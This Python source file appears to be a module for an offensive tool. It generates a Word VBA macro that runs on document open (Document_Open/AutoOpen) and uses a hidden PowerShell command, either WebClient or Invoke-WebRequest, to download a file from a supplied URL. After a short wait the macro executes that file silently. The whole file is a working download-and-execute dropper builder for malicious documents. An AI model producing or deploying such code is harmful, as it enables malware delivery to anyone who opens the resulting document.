import os

metadata = {
    "name": "DownloadAndExecute",
    "description": "Downloads a file from a URL and executes it using PowerShell. Method options: 'webclient' or 'iwr'. If 'filename' is omitted, it is extracted from the URL.",
    "parameters": ["url", "method"]
}

def split_vba_string(s, max_len=200):
    lines = [s[i:i+max_len] for i in range(0, len(s), max_len)]
    return '" & _\n          "'.join(lines)

def generate_macro_code(params):
    url = params["url"]
    method = params["method"].lower()
    filename = os.path.basename(url)

    if method == "webclient":
        ps_command = f"powershell (New-Object System.Net.WebClient).DownloadFile('{url}', '{filename}')"
    elif method == "iwr":
        ps_command = f"powershell Invoke-WebRequest -Uri '{url}' -OutFile '{filename}'"
    else:
        raise ValueError("Unsupported method. Use 'webclient' or 'iwr'.")

    split_command = split_vba_string(ps_command)

    return f'''
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "{split_command}"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path & "\\" & "{filename}"
    Wait (2)
    Shell exePath, vbHide
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
'''